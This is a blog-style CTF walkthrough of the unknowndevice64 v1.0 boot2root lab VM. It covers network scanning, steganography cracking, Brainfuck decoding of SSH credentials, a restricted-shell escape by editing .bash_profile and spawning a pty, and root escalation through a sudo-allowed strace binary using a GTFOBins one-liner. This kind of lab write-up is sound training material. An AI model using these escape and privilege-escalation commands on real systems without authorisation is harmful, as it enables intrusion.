---
layout: post
title: CTF unknowndevice64-1
date:   2022-01-19 13:51:42 -0600
categories: CTF
tags: Linux
---

# Intro
Description: unknowndevice64 v1.0 is a medium level boot2root challenge. The OVA has been tested on both VMware and Virtual Box.

Difficulty: Intermediate

Flags: Your Goal is to get root and read /root/flag.txt

Networking:

    DHCP: Enabled
    IP Address: Automatically assigned

Hint: Follow your intuitions ... and enumerate! and for any questions, feel free to contact me on Twitter: @unknowndevice64

Happy Hacking..!!!


# Scan
## netdiscover
![](https://i.imgur.com/eHoR0KN.png)
192.168.0.40

## nmap
```zsh
nmap 192.168.0.40 -sV -p-
```
![](https://i.imgur.com/x34ICSR.png)

## python http server

![](https://i.imgur.com/M0aeDlW.png)

In the source code we can found  this picture. 
![](https://i.imgur.com/1lZ5Nxd.png)
http://192.168.0.40:31337/key_is_h1dd3n.jpg
It's interesting, I will do someting on it later.

## nikto
nothing interesting

## Metadata
```zsh
dentify -verbose key_is_h1dd3n.jpg
```
Nothing interesting
```zsh
file key_is_h1dd3n.jpg
```
key_is_h1dd3n.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 300x300, components 1

## Crack key_is_h1dd3n.jpg

I use this tool.
https://github.com/Paradoxis/StegCracker

```zsh
echo "h1dd3n" > ahhh.txt  
stegcracker key_is_h1dd3n.jpg ahhh.txt 
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.-----------------.

This is the output, the password was h1dd3n, it's write in the file name lol.

## decoder detector

https://www.dcode.fr/identification-chiffrement 
![](https://i.imgur.com/uPDeBBP.png)

I have to use brainfuck.

## Decode brainfuck
Seriously, I was stuck on this web page for 2 minutes because I was unable to see the output on the left...

![](https://i.imgur.com/w5bKNVI.png)
`ud64:1M!#64@ud`

## ssh

```zsh
ssh ud64@192.168.0.40 -p 1337
```
password:
`1M!#64@ud`

It's broken everywhere.
-rbash: /bin/ls: restricted: cannot specify `/' in command names
But I can use vi.

## $PATH

The PATH variable is almost empty.
```zsh
ud64@unknowndevice64_v1:~$ echo $PATH
/home/ud64/prog
ud64@unknowndevice64_v1:~$ export PATH=$PATH:/usr/local/bin
-rbash: PATH: readonly variable
```
There is something in prog.
I use TAB to show what is in the directory.
```zsh
ud64@unknowndevice64_v1:~$ ls 
.bash_history  .screenrc      Downloads/     Public/        web/           
.bash_profile  Desktop/       Music/         Videos/        
.config/       Documents/     Pictures/      prog/          
ud64@unknowndevice64_v1:~$ ls prog/
date    id      vi      whoami  
```
I have edited the .bash_profile to change the PATH.
```zsh
PATH=$HOME/prog:/usr/local/bin:/usr/bin:/bin
```
Some commands still don't work but it's good for python
```zsh
python -c 'import pty; pty.spawn("/bin/bash")'
```
Now everything is working.



## sudo -l
```zsh
ud64@unknowndevice64_v1:~$ sudo -l
User ud64 may run the following commands on unknowndevice64_v1:
    (ALL) NOPASSWD: /usr/bin/sysud64
```
Let's try it.
```zsh
sudo /usr/bin/sysud64 su
```
Oh god, it's broken everywhere, but I'm root, gg wp.
![](https://i.imgur.com/tQ6gOQP.png)

## sysud64
```zsh
ud64@unknowndevice64_v1:~$ sudo /usr/bin/sysud64 -V
strace -- version 4.22
Copyright (c) 1991-2018 The strace developers <https://strace.io>.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

Optional features enabled: stack-unwind stack-demangle m32-mpers mx32-mpers
```
It's strace. let's see in gtfobin what we can do.
https://gtfobins.github.io/gtfobins/strace/
strace -o /dev/null /bin/sh
So for me it will be: 
```zsh
sudo /usr/bin/sysud64 -o /dev/null /bin/sh
```
![](https://i.imgur.com/nrUj5ko.png)

![](https://i.imgur.com/ysLaZBM.png))







